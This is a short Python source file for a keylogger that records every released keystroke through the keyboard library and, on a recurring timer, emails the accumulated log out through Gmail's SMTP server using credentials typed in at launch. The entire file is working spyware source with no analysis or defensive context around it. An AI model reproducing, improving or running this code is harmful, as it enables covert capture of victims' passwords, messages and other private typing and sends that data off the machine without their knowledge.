import keyboard, os, smtplib, getpass
from threading import Timer


# get email address and password
EMAIL_ADDRESS = input("Email Address: ")
EMAIL_PASSWORD = getpass.getpass("Email Password: ")


class Keylogger:
  def __init__(self, interval):
    # initialize interval
    self.interval = interval

    # record keylogs
    self.log = ""

  def callback(self,event):
    # callback is invoked whenever a keyboard event is occurred
    name = event.name

    if len(name) > 1:
      if name == "space":
        name = " "
      elif name == "enter":
        name = "[ENTER]\n"
      elif name == "decimal":
        name = "."
      elif name == "esc":
        os._exit(1)
      else:
        name = name.replace(" ", "_")
        name = f"[{name.upper()}]"

    self.log += name

  def sendmail(self,email,password,message):
    # setup SMTP connection
    server = smtplib.SMTP(host="smtp.gmail.com", port=587)
    server.starttls()

    # login and password,then send send mail
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()

  def report(self):
    # send keylogs 
    if self.log:
      self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)

    # reset self.log variable
    self.log = ""

    # die when main thread die
    timer = Timer(interval=self.interval, function=self.report)
    timer.daemon = True
    timer.start()

  def start(self):
    # run on startup
    keyboard.on_release(callback=self.callback)
    self.report()
    keyboard.wait()
